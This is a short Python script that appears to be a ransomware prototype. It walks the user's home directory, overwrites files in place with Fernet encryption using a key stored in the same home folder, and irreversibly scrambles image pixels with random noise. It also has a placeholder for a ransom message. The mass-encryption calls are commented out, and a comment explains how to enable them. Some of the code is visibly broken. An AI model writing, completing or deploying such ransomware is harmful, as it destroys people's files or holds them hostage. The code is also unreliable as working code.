from decimal import DivisionByZero
from cryptography.fernet import Fernet
import imageio.v2 as imageio
import os, re, numpy
import random

def encrypt_users(path):
    for files in os.listdir(path):
        if os.path.isdir(path + "\\" + files):
            encrypt_users(path + "\\" + files)
        else:
            if re.findall(".png|.jpg|.jpeg|.jpe|.jif|.jfif|.jfi|.gif|.tiff|.tif|.webp|.psd|.raw|.arw|.cr2|.nrw|.k25|.svg|.svgz|.bmp|.dib|.heif|.heic"):
                #encrypt_image(path)
                pass
            else:
                #encrypt_file(path + "\\" + files) 
                pass #remove this and uncomment the call to encrypt_file to make this work.

def encrypt_file(path):
    with open((os.path.expanduser("~") + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    try:
        with open(path) as file:
            original = bytes(file.read(), "utf-8")
        encrypted = fernet.encrypt(original)
        with open(path, "wb") as file:
            file.write(encrypted)
    except:
        pass

def decrypt_file(path):
    with open((os.path.expanduser("~") + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    try:
        with open(path) as file:
            encrypted = file.read()
        original = fernet.decrypt(encrypted)
        with open(path, "w") as file:
            file.write(original.decode())
    except:
        pass

def encrypt_image(path):
    try: 
        with imageio.imopen(path, "r") as file:
            original = file.read()
            array = numpy.copy(original)
            for i in range(len(array)):
                for j in range(len(array[i])):
                    for k in range(len(array[i][j])):
                        array[i][j][k] += random.randint(0, 255)
            imageio.imwrite(path, array)
    except: 
        pass #does nothing if it fails

def generate_key():
    key = Fernet.generate_key()
    with open((os.path.expanduser("~") + "\\key.txt"), "wb") as file:
        file.write(key)

def generate_ransome_message():
    pass


def main():
    #print(os.listdir(os.path.expanduser("~")))
    #encrypt_users(os.path.expanduser("~"))
    #generate_key()
    encrypt_image("harambe.jpg")
    #decrypt_file("tiger.png")

if __name__ == "__main__":
    main()